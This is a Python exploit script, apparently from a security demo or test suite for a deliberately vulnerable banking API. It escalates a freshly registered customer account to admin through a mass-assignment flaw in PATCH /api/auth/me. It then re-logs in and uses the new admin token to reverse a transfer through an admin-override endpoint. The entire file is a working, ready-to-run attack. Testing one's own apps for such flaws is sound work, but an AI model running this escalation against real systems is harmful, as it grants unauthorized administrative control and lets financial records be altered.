"""
privilege_escalation.py — a fresh customer promotes itself to admin.

Vuln / bot scenario:  PATCH /api/auth/me applies ANY field with no allowlist
                      (mass assignment). A plain customer sends {"role":"admin"}
                      and the row is genuinely elevated; the NEXT access token
                      then carries role=admin and satisfies every role-checked
                      BFLA/admin endpoint in the app.
F5 XC category:       API Security: Mass Assignment -> Privilege Escalation
                      (BFLA enabler).

Flow:
    1. Register a throwaway customer and log in — confirm role == "customer".
    2. PATCH /me {"role":"admin"} — confirm the response role flips to "admin".
    3. Log in AGAIN to mint a token carrying role=admin.
    4. Exercise a role-gated endpoint (transfers admin-override) to prove the
       elevated token is honoured.

Usage:
    python3 privilege_escalation.py
"""

import argparse
import os
import sys
import uuid

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from config import (BASE_URL, auth_headers, login, make_client, register)


def main():
    ap = argparse.ArgumentParser(description="Mass-assignment privilege-escalation bot.")
    ap.add_argument("--transfer-id", type=int, default=1,
                    help="a transfer id to target with admin-override as proof")
    args = ap.parse_args()

    email = f"escalate-{uuid.uuid4().hex[:10]}@nimbusbank.io"
    print(f"Target: {BASE_URL}/api/auth/me  (PATCH mass assignment)\n")

    with make_client() as client:
        register(client, email)
        token, user = login(client, email, "password123")
        hdrs = auth_headers(token)
        print(f"1. registered + logged in as {email}")
        print(f"   role before: {user.get('role')!r}")

        r = client.patch("/api/auth/me", headers=hdrs, json={"role": "admin"})
        after = r.json() if r.status_code == 200 else {}
        print(f"2. PATCH /me {{'role':'admin'}} -> {r.status_code}, "
              f"role now: {after.get('role')!r}")

        # Re-login to mint a token that CARRIES the elevated role claim.
        token2, user2 = login(client, email, "password123")
        hdrs2 = auth_headers(token2)
        print(f"3. re-logged in; fresh token role claim: {user2.get('role')!r}")

        ovr = client.post("/api/transfers/transfers/admin-override", headers=hdrs2,
                          json={"transfer_id": args.transfer_id, "new_status": "reversed"})
        print(f"4. admin-override on transfer {args.transfer_id} -> {ovr.status_code} "
              f"{ovr.text[:120]}")

    print("\n--- report ---")
    escalated = after.get("role") == "admin"
    print(f"privilege escalation: {'SUCCESS' if escalated else 'FAILED'} "
          f"(customer -> admin via unguarded PATCH /me)")


if __name__ == "__main__":
    main()
